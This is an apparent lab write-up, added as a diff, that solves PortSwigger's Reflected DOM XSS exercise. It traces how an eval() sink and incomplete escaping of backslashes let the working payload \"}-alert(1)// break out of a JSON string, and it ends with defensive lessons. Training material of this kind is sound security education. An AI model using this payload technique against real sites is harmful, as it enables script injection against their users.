@@ -1,0 +1,71 @@
+================================
+LAB: Reflected DOM XSS
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-26
+Lab URL: PortSwigger Web Security Academy
+Category: Cross-Site Scripting (XSS)
+Level: Practitioner
+Objective: Create an injection that calls the alert() function
+Description: Reflected DOM XSS occurs when the server reflects user input into
+the response, and a client-side script processes that data unsafely, writing it
+to a dangerous sink.
+
+[RECONNAISSANCE]
+----------------
+- Search functionality found on the page
+- Submitted unique string "e5f8r7f2" via search bar
+- Server response: {"results":[],"searchTerm":"e5f8r7f2"}
+- User input is reflected inside a JSON object under the key "searchTerm"
+- Located client-side JS script handling the search response
+
+Key script logic:
+  xhr.onreadystatechange: fetches /search?q=<input>
+  eval('var searchResultsObj = ' + this.responseText);  <- dangerous sink
+  displaySearchResults() then reads searchResultsObj.searchTerm via innerText (safe)
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+- Sink: eval() concatenates raw server response and executes it as JS code
+- Server escapes double quotes: " -> "  (partial protection)
+- Server does NOT escape backslashes
+- Sending " causes server to produce \" in JSON:
+    \ = literal backslash (valid JSON escape)
+    "  = closes the string (breaks JSON structure)
+- This allows breaking out of the JSON string context and injecting arbitrary JS
+
+[EXPLOITATION]
+--------------
+Payload: \"}-alert(1)//
+
+URL: https://<lab-id>.web-security-academy.net/?search=\"}-alert(1)//
+
+Server reflects: {"results":[],"searchTerm":"\"}-alert(1)//"}
+
+eval() executes:
+  var searchResultsObj = {"results":[],"searchTerm":"\"}
+  -alert(1)//"}
+
+Breakdown:
+  \  -> literal backslash inside string
+  "   -> closes the searchTerm string
+  }   -> closes the JSON object
+  -alert(1) -> valid JS expression, executed by eval()
+  //  -> comments out the remaining "}  from the original JSON
+
+Result: alert() triggered.
+
+[EVIDENCE]
+----------
+- alert() popup displayed in browser
+- Lab marked as solved by PortSwigger platform
+
+[LESSONS LEARNED]
+-----------------
+- eval() on unsanitized server responses is critical — treat it as RCE in browser context
+- Escaping only " is insufficient; backslash must also be escaped to prevent \" bypass
+- Reflected DOM XSS is harder to spot than classic reflected XSS — requires reading client-side JS
+- Safe alternative: use JSON.parse() instead of eval() to parse JSON responses
+- innerText is safe; innerHTML, eval, document.write are dangerous sinks to flag in code review
